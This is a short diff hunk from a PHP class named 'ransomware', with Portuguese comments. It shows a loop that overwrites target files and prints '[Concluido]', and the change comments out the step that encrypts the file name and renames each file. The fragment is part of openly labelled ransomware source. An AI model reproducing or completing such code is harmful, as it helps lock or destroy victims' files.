@@ -73,8 +73,8 @@ class ransomware{
                         fclose($escrever);
                         //Retorna OK caso tenha dado certo
                         echo "$alvo [Concluido]\n";
-                        $criptonome = $this -> criptografanome($alvo);
-                        rename($alvo, $criptonome.$ext);
+                        //$criptonome = $this -> criptografanome($alvo);
+                        //rename($alvo, $criptonome.$ext);
                     }
                     //Se nao foi possivel abrir o arquivo retorna failed
                     else {
